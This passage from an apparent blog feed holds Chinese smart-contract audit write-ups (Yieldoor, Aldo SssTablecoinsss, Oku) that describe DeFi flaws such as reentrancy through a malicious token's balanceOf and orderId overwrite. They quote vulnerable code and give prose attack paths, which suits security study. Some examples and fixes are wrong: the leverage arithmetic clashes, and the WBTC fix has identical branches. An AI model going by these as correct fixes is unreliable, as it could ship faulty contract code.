<code>getBorrowATokenV1_5Descriptions</code> 和 <code>getPriceFeedDescriptions </code>时因为 gas 不足而回滚，或者需要大量 gas，最终导致资金损失。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-Yieldoor 审计报告</title>
      <link href="/2025/03/04/sherlock-Yieldoor-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2025/03/04/sherlock-Yieldoor-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Yieldoor"><a href="#Yieldoor" class="headerlink" title="Yieldoor"></a>Yieldoor</h1><h1 id="整数溢出-（高）"><a href="#整数溢出-（高）" class="headerlink" title="整数溢出 （高）"></a>整数溢出 （高）</h1><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 index = (observationCardinality + currentIndex - i) % observationCardinality;</span><br></pre></td></tr></table></figure><p>这里的observationCardinality和currentIndex在合约中都是uint16的类型，也就是说2^16-1</p><p>0-65535,当他们俩个相加的话就会出现整数溢出，导致依赖计算的函数都会无法进行</p><p>溢出就会导致整个合约的核心功能无法使用</p><h1 id="杠杆base计算错误-（高）"><a href="#杠杆base计算错误-（高）" class="headerlink" title="杠杆base计算错误 （高）"></a>杠杆base计算错误 （高）</h1><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base = owedAmount / vp.maxTimesLeverage;</span><br></pre></td></tr></table></figure><p>使用了借款金额，来计算base,可能会导致超过初始抵押品的，导致用户被清算。</p><p>计算 base 时 未考虑初始抵押品 initCollateralValue，导致 base 可能超出合理范围。<br>这导致用户在 实际抵押品仍然充足的情况下被提前清算。<br>例子如下：<br>假设：</p><ul><li>用户存入 1000 USDT 作为抵押</li><li>借入 1000 USDT，总仓位变成 2000 USDT</li><li>vp.maxTimesLeverage &#x3D; 2（最大杠杆 2 倍）</li><li>最小抵押比率 vp.minCollateralPct &#x3D; 10%<br>状态 1（初始情况，正常）：</li><li>base &#x3D; owedAmount &#x2F; maxTimesLeverage &#x3D; 1000 &#x2F; 2 &#x3D; 500</li><li>2000 - 500 &#x3D; 1500（剩余抵押）</li><li>vp.minCollateralPct * owedAmount &#x3D; 0.1 * 1000 &#x3D; 100</li><li>1500 &gt; 100 ✅ 不会被清算</li><li>状态 2（借款增长，触发清算）：</li><li>borrow 增长到 1100 USDT</li><li>base &#x3D; 1100 &#x2F; 1 &#x3D; 1100</li><li>2000 - 1100 &#x3D; 900</li><li>vp.minCollateralPct * owedAmount &#x3D; 0.1 * 1100 &#x3D; 110</li><li>问题：900 &lt; 110，导致被错误清算 ❌</li></ul><h2 id="杠杆原理："><a href="#杠杆原理：" class="headerlink" title="杠杆原理："></a>杠杆原理：</h2><p>杠杆交易是一种 利用借贷放大交易规模 的方式，它允许交易者用 较少的资金 控制 更大规模的资产，从而放大 盈利或亏损<br><strong>杠杆（Leverage）</strong><br>杠杆表示交易者 放大资金规模的倍数</p><p>例如：<br>2x（2倍杠杆）：用 1000 USDT，可以开 2000 USDT 的仓位（借 1000 USDT）<br>5x（5倍杠杆）：用 1000 USDT，可以开 5000 USDT 的仓位（借 4000 USDT）<br>杠杆可以让 收益放大，但同样 亏损也会放大，甚至 导致爆仓（亏损达到一定比例，被强制平仓）。<br><strong>开仓（Open Position）</strong><br>开仓 就是 建立一个杠杆交易，可以分为：</p><ul><li>多头（Long，做多）：借入资金买入资产，预期价格上涨后卖出获利。</li><li>空头（Short，做空）：借入资产卖出，预期价格下跌后买回获利。<br><strong>保证金（Margin</strong><br>保证金是 用户提供的初始资金，相当于交易的 押金，用于 抵御市场波动。</li></ul><p>初始保证金（Initial Margin）：开仓时投入的本金。<br>维持保证金（Maintenance Margin）：持仓时 账户最低可承受亏损的资金，如果低于维持保证金，就会被 强制平仓（爆仓）。<br>例如：</p><p>你用 1000 USDT 开 5 倍杠杆，持有 5000 USDT 资产。<br>如果 亏损 20%（即 1000 USDT），你的 保证金归零，系统会 强制平仓。<br><strong>强平（强制平仓）</strong><br>当亏损 超过保证金的承受范围，交易所会 自动卖出 资产，以防止更大的亏损。如果亏损 接近保证金，系统会 自动平仓，导致 本金全部损失。</p><h1 id="零抵押开仓，过度杠杆化-（高）"><a href="#零抵押开仓，过度杠杆化-（高）" class="headerlink" title="零抵押开仓，过度杠杆化 （高）"></a>零抵押开仓，过度杠杆化 （高）</h1><p>未验证用户初始抵押，导致零抵押杠杆仓位<br>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function openLeveragedPosition(LeveragedPosition memory lp) external &#123;</span><br><span class="line">    require(vaultParams[lp.vault].leverageEnabled, &quot;Leverage not enabled&quot;);</span><br><span class="line"></span><br><span class="line">    uint256 delta0 = lp.vault0In - lp.amount0In; // 计算闪电贷借入金额</span><br><span class="line">    uint256 delta1 = lp.vault1In - lp.amount1In;</span><br><span class="line"></span><br><span class="line">    // **漏洞：这里没有检查 lp.amount0In 和 lp.amount1In 是否大于零**</span><br><span class="line">    // 如果用户提供的初始抵押为 0，整个杠杆仓位就完全由借来的资金组成</span><br><span class="line"></span><br><span class="line">    // 调用借贷池借入 delta0 和 delta1</span><br><span class="line">    flashloan(delta0, delta1);</span><br><span class="line"></span><br><span class="line">    // 存入资金，创建杠杆仓位</span><br><span class="line">    IVault(lp.vault).deposit(lp.vault0In, lp.vault1In);</span><br><span class="line"></span><br><span class="line">    // 记录仓位</span><br><span class="line">    positions[msg.sender] = lp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lp.amount0In 和 lp.amount1In 未强制要求大于零。<br>攻击者可以提供零抵押（amount0In &#x3D; 0, amount1In &#x3D; 0），仅使用 借来的资金（flashloan） 开启杠杆仓位。</p><h1 id="杠杆上限被限制为-2x-计算错误-（高）"><a href="#杠杆上限被限制为-2x-计算错误-（高）" class="headerlink" title="杠杆上限被限制为 2x,计算错误 （高）"></a>杠杆上限被限制为 2x,计算错误 （高）</h1><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 positionLeverage = (up.initCollateralValue + up.borrowedAmount) * 1e18 / up.initCollateralValue;</span><br><span class="line">require(initCollateralValue &gt;= borrowedAmount, &quot;Liquidatable Position&quot;);</span><br></pre></td></tr></table></figure><p>计算杠杆的仓位，但是又要求initCollateralValue &gt;&#x3D; borrowedAmount，这就导致计算positionLeverage只能限制2x,不符合协议的要求</p><h1 id="杠杆机制注意清算问题，计算的时候，会不会有什么计算的错误，使用了错误的杠杆倍数，检查不清楚条件"><a href="#杠杆机制注意清算问题，计算的时候，会不会有什么计算的错误，使用了错误的杠杆倍数，检查不清楚条件" class="headerlink" title="杠杆机制注意清算问题，计算的时候，会不会有什么计算的错误，使用了错误的杠杆倍数，检查不清楚条件"></a>杠杆机制注意清算问题，计算的时候，会不会有什么计算的错误，使用了错误的杠杆倍数，检查不清楚条件</h1><h1 id="不更新变量-（中）"><a href="#不更新变量-（中）" class="headerlink" title="不更新变量 （中）"></a>不更新变量 （中）</h1><p>合约中的 _getTokenIn() 方法在解析 多跳交换（Multi-hop Swap） 时，路径（path）变量未更新，导致无限循环。<br>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getTokenIn(bytes memory path) internal pure returns (address) &#123;  </span><br><span class="line">    while (path.hasMultiplePools()) &#123;  </span><br><span class="line">        path.skipToken();  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    (, address tokenIn,) = path.decodeFirstPool();  </span><br><span class="line">    return tokenIn;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>path.skipToken(); 不会修改 path 变量，而只是跳过了一个代币，但 path 本身并没有更新。<br>由于 path 没有改变，path.hasMultiplePools() 永远为真，导致无限循环。</p><h1 id="还款方式计算错误-（中）"><a href="#还款方式计算错误-（中）" class="headerlink" title="还款方式计算错误 （中）"></a>还款方式计算错误 （中）</h1><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (borrowed == up.token1) &#123;  </span><br><span class="line">    uint256 repayFromWithdraw = amountOut1 &lt; owedAmount ? amountOut0 : owedAmount;  </span><br><span class="line">    owedAmount -= repayFromWithdraw;  </span><br><span class="line">    amountOut1 -= repayFromWithdraw;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 <code>borrowed == up.token1</code> 时，应该用 <code>amountOut1</code> 来偿还借款，而这里却在 <code>repayFromWithdraw </code>计算中使用了 amountOut0。<br>这意味着：<br>如果 <code>amountOut1 &lt; owedAmount</code>（即用户提取的 token1 不够偿还借款），代码应该使用 <code>amountOut1</code>，但错误地使用了 <code>amountOut0</code>（这是 token0 的输出）。<br>由于 <code>amountOut0</code> 可能与<code> amountOut1</code> 无关，这可能会导致：<br>未能正确偿还借款（Underpayment），导致用户的仓位可能变得 低于抵押要求（under-collateralized），可能触发 清算（liquidation）。<br>过度偿还（Overpayment），如果 <code>amountOut0</code> 远大于 <code>owedAmount</code>，用户可能 额外支付不必要的资金。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>codeHawks-2024-12-Aldo SssTablecoinsss 审计报告</title>
      <link href="/2024/12/16/codeHawks-2024-12-Aldo-SssTablecoinsss-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/12/16/codeHawks-2024-12-Aldo-SssTablecoinsss-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Aldo-SssTablecoinsss-审计报告"><a href="#Aldo-SssTablecoinsss-审计报告" class="headerlink" title="Aldo SssTablecoinsss 审计报告"></a>Aldo SssTablecoinsss 审计报告</h1><p>这次抽空在codeHarw上面，做了一次首飞。是关于defi 的。结果使用p语言写的，导致很多人可能就没有去参加，我也提交了3个，虽然只有一个被判为中等，但是这是我第一次被选择成最终报告</p><p>这是我正确的报告</p><h1 id="语言机的时间设置的太大（中等）（me）（被选为作为报告）"><a href="#语言机的时间设置的太大（中等）（me）（被选为作为报告）" class="headerlink" title="语言机的时间设置的太大（中等）（me）（被选为作为报告）"></a>语言机的时间设置的太大（中等）（me）（被选为作为报告）</h1><p>M-01. The TIMEOUT is set as a fixed constant of 72 hours, which makes it inflexible in adapting to the market price.<br>Summary<br>In this contract, the TIMEOUT is set as a fixed constant (72 hours, or 259200 seconds). This means that if the oracle price data is not updated within 72 hours, the data will be considered outdated, and the contract will trigger a revert.</p><p>Vulnerability Details<br>At this location in the code,<br><a href="https://github.com/Cyfrin/2024-12-algo-ssstablecoinsss/blob/4cc3197b13f1db728fd6509cc1dcbfd7a2360179/src/oracle_lib.vy#L15">https://github.com/Cyfrin/2024-12-algo-ssstablecoinsss/blob/4cc3197b13f1db728fd6509cc1dcbfd7a2360179/src/oracle_lib.vy#L15</a></p><p>Copy to clipboard<br>1<br>TIMEOUT: constant(uint256) &#x3D; 72 * 3600<br>the timeout is directly set to 72 hours. For an oracle, which cannot dynamically adjust the price updates, this is a suboptimal approach.</p><p>Impact<br>Fixed Timeout: The TIMEOUT is hardcoded to 72 hours. In markets with frequent fluctuations or assets that require more frequent price updates, 72 hours might be too long. Conversely, if the timeout is too short, it could cause frequent errors due to the inability to update data in time, disrupting normal contract operations.</p><p>Non-adjustable Timeout: If the contract’s requirements change (e.g., market conditions evolve or the protocol requires more flexibility), the fixed TIMEOUT cannot be dynamically adjusted, leading to potential mismatches with current needs.</p><p>Lack of Flexibility: The current timeout mechanism is static and cannot be adjusted based on market volatility or the frequency of oracle updates. In volatile markets, a shorter TIMEOUT might be necessary, while in stable markets, a longer timeout would be more appropriate.<br>##Tools Used</p><p>Manual review</p><p>Recommendations<br>Introduce a dynamic price expiration mechanism that adjusts based on market conditions. Use volatility data (such as standard deviation or market price fluctuation) to dynamically adjust the timeout period. This can be achieved by monitoring market volatility and adjusting the T</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Monitor market volatility and dynamically adjust TIMEOUT</span><br><span class="line">@external</span><br><span class="line">def adjustTimeoutBasedOnVolatility(volatility: uint256):</span><br><span class="line">    if volatility &gt; HIGH_VOLATILITY_THRESHOLD:</span><br><span class="line">        self.TIMEOUT = SHORTER_TIMEOUT  # In high volatility, decrease TIMEOUT</span><br><span class="line">    else:</span><br><span class="line">        self.TIMEOUT = LONGER_TIMEOUT  # In stable market, increase TIMEOUT</span><br><span class="line">    log TimeoutAdjusted(self.TIMEOUT)</span><br></pre></td></tr></table></figure><h1 id="只检查了第一个wethd，精度的不同，导致差距过大（高）"><a href="#只检查了第一个wethd，精度的不同，导致差距过大（高）" class="headerlink" title="只检查了第一个wethd，精度的不同，导致差距过大（高）"></a>只检查了第一个wethd，精度的不同，导致差距过大（高）</h1><p>H-01. In the function _revert_if_health_factor_is_broken constatnt variable MIN_HEALTH_FACTOR is only for WETH.<br>Summary<br>The _revert_if_health_factor_is_broken function is responsible for ensuring that a user’s health factor meets the minimum required standard. There is only implementation for WETH.</p><p>Vulnerability Details<br>In the function, there is only implementation for WETH.</p><p>Copy to clipboard</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@internal</span><br><span class="line">def _revert_if_health_factor_is_broken(user: address):</span><br><span class="line">    user_health_factor: uint256 = self._health_factor(user)</span><br><span class="line">    assert (</span><br><span class="line">        user_health_factor &gt;= MIN_HEALTH_FACTOR</span><br><span class="line">    ), &quot;DSCEngine__BreaksHealthFactor&quot;</span><br></pre></td></tr></table></figure><p>Value of the MIN_HEALTH_FACTOR&#x3D;10^18is higher than the Satoshi factor which is 10^8.</p><p>As a result, for WBTC, the user_health_factor can be inflated to more than 101010^{10} times its normal value.</p><p>Impact<br>Bigger value of MIN_HEALTH_FACTOR for WBTC allows on bigger value of user_health_factorand wrong value when </p><p>function should revert.</p><p>Tools Used<br>manual review</p><p>Recommendations<br>Add MIN_HEALTH_FACTOR also for WBTC.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@internal</span><br><span class="line">def _revert_if_health_factor_is_broken(user: address):</span><br><span class="line">    user_health_factor: uint256 = self._health_factor(user)</span><br><span class="line">    </span><br><span class="line">    # Check if the user&#x27;s token is WBTC and adjust health factor accordingly</span><br><span class="line">    if user_health_factor &gt;= (MIN_HEALTH_FACTOR * 10**10):</span><br><span class="line">        # If user health factor is higher due to WBTC precision, still ensure it meets the minimum</span><br><span class="line">        assert user_health_factor &gt;= MIN_HEALTH_FACTOR, &quot;DSCEngine__BreaksHealthFactor&quot;</span><br><span class="line">    else:</span><br><span class="line">        assert user_health_factor &gt;= MIN_HEALTH_FACTOR, &quot;DSCEngine__BreaksHealthFactor&quot;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>个人认为这次的难度不大，就是要注意一点，对于p语言的的掌握不够，还得多加学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-2024-11-Oku&#39;sNew Order Types 审计报告</title>
      <link href="/2024/12/10/sherlock-2024-11-Oku-sNew-Order-Types-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/12/10/sherlock-2024-11-Oku-sNew-Order-Types-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>在执行 _getExchangeRate函数的时候，没有检查，tokenIn和tokenOut是不是同种的代币，导致一些无意义的汇率计算出来</p><p>Root Cause<br>2024-11-oku-HeYuan-33&#x2F;oku-custom-order-types&#x2F;contracts&#x2F;automatedTrigger&#x2F;AutomationMaster.sol</p><p>Lines 77 to 86 in ee3f781</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getExchangeRate( </span><br><span class="line">    IERC20 tokenIn, </span><br><span class="line">    IERC20 tokenOut </span><br><span class="line">) internal view returns (uint256 exchangeRate) &#123; </span><br><span class="line">    // Retrieve USD prices from oracles, scaled to 1e8 </span><br><span class="line">    uint256 priceIn = oracles[tokenIn].currentValue(); </span><br><span class="line">    uint256 priceOut = oracles[tokenOut].currentValue(); </span><br><span class="line"> </span><br><span class="line">    // Return the exchange rate in 1e8 terms </span><br><span class="line">    return (priceIn * 1e8) / priceOut; </span><br></pre></td></tr></table></figure><p>This code calculates the exchange rate between two tokens, but it doesn’t check if the two tokens are the same. This oversight can affect the getMinAmountReceived function. When the same token is provided for both the input and output, no actual exchange happens, but due to the slippage mechanism, the user will see a reduced amount.<br>Example:</p><p>The user submits 100 DAI and targets an exchange of 100 DAI (i.e., both tokenIn and tokenOut are DAI).<br>The user sets a 1% slippage (i.e., slippageBips &#x3D; 100), allowing for up to 1% price deviation.<br>minAmountReceived &#x3D; (100 * (10000 - 100)) &#x2F; 10000 &#x3D; 99.0 DAI<br>This means that the user expects to receive at least 99 DAI, accounting for the 1% slippage.<br>However, since no actual token swap occurs (because both the input and output tokens are the same), the user still holds 100 DAI without any exchange taking place. The calculation for minAmountReceived is incorrect, as it assumes that a token swap has occurred, when in reality, there has been no exchange.<br>As a result, the system might show a reduced amount due to the slippage tolerance, even though no actual trade was made.</p><h2 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Funds Loss:<br>If the contract does not prevent swapping the same token, users might make decisions based on incorrect minimum received amounts in other parts of the logic (e.g., through other contracts), leading to loss of funds.</p><p>Dependency on Vulnerable Contracts:<br>If other contracts rely on functions like getMinAmountReceived or similar exchange rate calculation functions to determine if a transaction should be executed, an attacker could exploit this vulnerability. By submitting transactions with the same token being swapped, this could lead to incorrect decision-making and improper execution of trades.</p><p>Gas Waste:<br>Attackers could initiate many such meaningless exchange transactions, which would consume a significant amount of gas without any real effect on the system. This results in increased gas costs for the network and potential denial of service for legitimate users.</p><p>Division by zero：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint8 decimalIn = ERC20(address(tokenIn)).decimals();</span><br><span class="line">      uint8 decimalOut = ERC20(address(tokenOut)).decimals();</span><br><span class="line"></span><br><span class="line">      if (decimalIn &gt; decimalOut) &#123;</span><br><span class="line">          // Reduce amountIn to match the lower decimals of tokenOut</span><br><span class="line">          return amountIn / (10 ** (decimalIn - decimalOut));</span><br></pre></td></tr></table></figure><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check to verify whether tokenIn and tokenOut are the same token.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getExchangeRate(</span><br><span class="line">      IERC20 tokenIn,</span><br><span class="line">      IERC20 tokenOut</span><br><span class="line">  ) internal view returns (uint256 exchangeRate) &#123;</span><br><span class="line">      // Retrieve USD prices from oracles, scaled to 1e8</span><br><span class="line">      require(tokenIn != tokenOut, &quot;Input and output tokens must be different&quot;);</span><br><span class="line"></span><br><span class="line">      uint256 priceIn = oracles[tokenIn].currentValue();</span><br><span class="line">      uint256 priceOut = oracles[tokenOut].currentValue();</span><br><span class="line"></span><br><span class="line">      // Return the exchange rate in 1e8 terms</span><br><span class="line">     </span><br><span class="line">      return (priceIn * 1e8) / priceOut;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>这次是趁着期末，简单看了一下这个合约，没有太仔细的发现，就还是提交了一个中等的发现（除以零的情况），但是没有被认可，下面就来看看正确的发现吧</p><h1 id="重入攻击-（高）-第一次遇到在balanceOf填充恶意代码"><a href="#重入攻击-（高）-第一次遇到在balanceOf填充恶意代码" class="headerlink" title="重入攻击 （高）(第一次遇到在balanceOf填充恶意代码)"></a>重入攻击 （高）(第一次遇到在balanceOf填充恶意代码)</h1><p>重入攻击,就是在<code>fillOrder</code>函数 和 <code>execute</code>函数中，没有防止重入的修饰，而且也没有遵循 “检查-效果-交互”的模式，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function fillOrder(  </span><br><span class="line">    uint96 pendingOrderIdx,  </span><br><span class="line">    uint96 orderId,  </span><br><span class="line">    address target,  </span><br><span class="line">    bytes calldata txData  </span><br><span class="line">) external override &#123;  </span><br><span class="line">    // 获取订单</span><br><span class="line">    Order memory order = orders[orderId];  </span><br><span class="line"></span><br><span class="line">    require(  </span><br><span class="line">        order.orderId == pendingOrderIds[pendingOrderIdx],  </span><br><span class="line">        &quot;Order Fill Mismatch&quot;  </span><br><span class="line">    );  </span><br><span class="line"></span><br><span class="line">    // 执行 swap 操作</span><br><span class="line">    (uint256 amountOut, uint256 tokenInRefund) = execute(  </span><br><span class="line">        target,  </span><br><span class="line">        txData,  </span><br><span class="line">        order  </span><br><span class="line">    );  </span><br><span class="line"></span><br><span class="line">    // 移除 pendingOrderId</span><br><span class="line">    pendingOrderIds = ArrayMutation.removeFromArray(  </span><br><span class="line">        pendingOrderIdx,  </span><br><span class="line">        pendingOrderIds  </span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function execute(  </span><br><span class="line">    address target,  </span><br><span class="line">    bytes calldata txData,  </span><br><span class="line">    Order memory order  </span><br><span class="line">) internal returns (uint256 amountOut, uint256 tokenInRefund) &#123;  </span><br><span class="line">    // 获取代币初始余额</span><br><span class="line">    uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));  </span><br><span class="line">    uint256 initialTokenOut = order.tokenOut.balanceOf(address(this)); // @audit - 攻击者可在此处控制交易  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击的路径：</p><ul><li>攻击者创建一个恶意代币，其 balanceOf 方法被定制为在调用时执行恶意逻辑（如再次调用 fillOrder）。</li><li>攻击者创建一个 1 WETH -&gt; 恶意代币 的订单。</li><li>再创建另一个任意订单（仅用作占位）。</li><li>攻击者调用 fillOrder 填充其订单。在 execute 函数调用 tokenOut.balanceOf 时，恶意代币的逻辑被触发。</li><li>在 balanceOf 的恶意逻辑中，攻击者再次调用 fillOrder，填充相同的订单（此时订单尚未从 pendingOrderIds 中移除，重入得以成功）。</li><li>两次调用共消耗 2 ETH，但攻击者只需要支付 1 ETH，利用合约中的其余资金完成交易。</li><li>攻击者移除其两个订单，重复攻击，直到耗尽合约内的资金。</li></ul><p>个人认为这是一个非常好的示例，恶意的代币，那么它实现的ERC20的基础功能就可能会掺入恶意代币，比如这次的balanceOf函数中，就完全可以塞入恶意代码，看来我还得再如了解一下ERC20的基础功能了（苦笑）</p><h1 id="计算orderId-可以被预测，然后再覆盖-（高）"><a href="#计算orderId-可以被预测，然后再覆盖-（高）" class="headerlink" title="计算orderId 可以被预测，然后再覆盖 （高）"></a>计算orderId 可以被预测，然后再覆盖 （高）</h1><p>使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 orderId = uint256(keccak256(abi.encodePacked(recipient, block.timestamp)));</span><br></pre></td></tr></table></figure><p>此方法存在以下缺陷：</p><ul><li>缺乏唯一性：当同一块中存在多个 createOrder 调用且具有相同的 recipient 时，这些订单的 orderId 会相同，覆盖订单映射中的条目。</li><li>排序器权限问题：在 Optimism 等链上，恶意排序器可以通过重排交易在同一块中插入恶意交易，从而覆盖合法用户的订单。</li><li>非标准代币漏洞：攻击者可以利用非标准代币，这些代币的 transferFrom 方法未验证 from 地址，从而进一步强化攻击。</li></ul><h2 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h2><ul><li>用户在一个区块内提交多个 createOrder 交易，订单的 recipient 相同但订单内容不同。</li><li>恶意排序器观察到这些交易后，构造一个利用非标准代币的恶意交易，该代币绕过了 transferFrom 的验证。</li><li>恶意排序器将自己的交易插入到区块的最后一笔，对应相同的 recipient。</li><li>因为 orderId 是基于 recipient 和 block.timestamp 生成的，前面的订单会被覆盖。</li><li>最终，orders[orderId] 映射的值被覆盖为恶意排序器的订单，导致合法用户的资金被替换。</li></ul><p>个人认为：这个地方是我之前注意到的，但是没有取仔细的推敲，导致就不能联想到这个正常的交易可以被覆盖，还是时间不充足吧</p><blockquote><p>在同一个区块可以进行多笔的交易，这样他们的时间戳就是一样的<br>交易被打包上链的过程：</p></blockquote><ol><li>用户发起交易。<br>信息包括：</li></ol><ul><li>交易发起者地址 (from)。</li><li>接收者地址 (to)。</li><li>发送的金额或调用合约的函数和参数。</li><li>用户设置的交易手续费（gasPrice 和 gasLimit）。</li><li>随机数 (nonce)，确保交易唯一性。</li><li>签名，证明交易是由用户发起的。</li></ul><ol start="2"><li>广播到网络<br>验证内容包括：</li></ol><ul><li>签名是否有效。</li><li>交易 nonce 是否正确（用户账户的 nonce 必须递增）。</li><li>用户账户余额是否足够支付交易金额和手续费。</li><li>验证通过的交易会被加入到节点的交易池中，等待矿工打包。</li></ul><ol start="3"><li>交易进入内存池（Mempool）<br>每个节点都有一个交易内存池（Mempool），存储尚未被打包的交易。<br>矿工会从交易池中挑选交易，通常优先选择 手续费较高 的交易，因为矿工的收益来源于手续费。<br>在 Optimism 等 Layer 2 网络中，交易进入 Sequencer，Sequencer 按一定规则排序并生成候选区块。</li><li>矿工打包交易<br>矿工（或验证者）从交易池中挑选一组交易，进行以下操作：<br>检查交易：<br>再次验证交易的合法性，包括签名、账户余额、nonce 等。<br>确保交易能够成功执行，否则会拒绝。<br>执行交易：<br>按照交易的顺序逐一执行，更新区块链的状态（如账户余额、合约存储等）。<br>执行后，计算交易消耗的 gas 并记录。<br>创建区块：<br>将所有成功的交易、区块头、block.timestamp、上一区块哈希等信息打包成一个新区块。</li><li>区块广播<br>矿工完成区块后，将新区块广播到整个网络，所有节点都会验证区块的合法性：<br>区块头是否正确（包括哈希计算、block.timestamp 等）。<br>区块中的所有交易是否合法且执行结果一致。</li><li>交易确认<br>当新区块被添加到区块链后：<br>交易正式被写入区块链，这一过程称为“上链”。<br>随着后续区块的增加，交易所在区块的深度增加，确认数越高，交易被篡改的可能性越低。<blockquote><p>注意点：<br>交易时间戳 (block.timestamp)：<br>由矿工决定，通常表示区块打包的时间，而不是每笔交易的时间。<br>同一个区块内的所有交易共享相同的 block.timestamp。<br>矿工选择交易的策略：<br>优先选择 gasPrice 较高的交易。<br>如果区块空间有限（gasLimit 达到上限），低手续费交易可能被延迟打包。<br>交易失败的处理：<br>如果交易执行失败（例如超出 gasLimit 或合约逻辑失败），交易仍会被记录在区块链中，但用户支付的 gas 无法退回。<br>Layer 2 的不同机制：<br>在 Rollup（如 Optimism）中，Sequencer 负责快速排序交易并生成区块，然后将区块数据提交到主链。</p></blockquote></li></ol><h1 id="攻击者可以修改被取消的订单（-高）"><a href="#攻击者可以修改被取消的订单（-高）" class="headerlink" title="攻击者可以修改被取消的订单（ 高）"></a>攻击者可以修改被取消的订单（ 高）</h1><p>当订单被取消时，资金会退回给用户。然而，问题在于即使订单已取消，攻击者仍可以修改这些取消的订单，从而获取额外的资金。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ensure delta is valid  </span><br><span class="line">require(_amountInDelta &lt; order.amountIn, &quot;invalid delta&quot;);  </span><br><span class="line"></span><br><span class="line">//set new amountIn for accounting  </span><br><span class="line">newAmountIn -= _amountInDelta;  </span><br><span class="line"></span><br><span class="line">//check min order size for new amount  </span><br><span class="line">MASTER.checkMinOrderSize(order.tokenIn, newAmountIn);  </span><br><span class="line"></span><br><span class="line">//refund position partially  </span><br><span class="line">order.tokenIn.safeTransfer(order.recipient, _amountInDelta);</span><br></pre></td></tr></table></figure><p>原因是：<br>orders[orderId] 在订单取消后未被删除，导致数据仍然保留，并可被进一步修改利用。</p><p>个人认为：这个是最多人发现的漏洞，但是如果不敏感，还是发现不了，因为你还是会觉得比较正常，如果是我的话，我也会跳过的，可能经验不足的太明显了</p><h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>还是错过了一个本来能发现的点，那个时间戳的问题，还是的联想其他合约代码是怎么使用的，对于业务逻辑理解不好，我觉得还是的花时间来去正真的看，不然就会使一味的去学习其他人的审计报告。还是好遗憾，那个时间戳的问题，还是没有去发现何实现，唉</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-ApproveMain</title>
      <link href="/2024/12/06/CTF-ApproveMain/"/>
      <url>/2024/12/06/CTF-ApproveMain/</url>
      
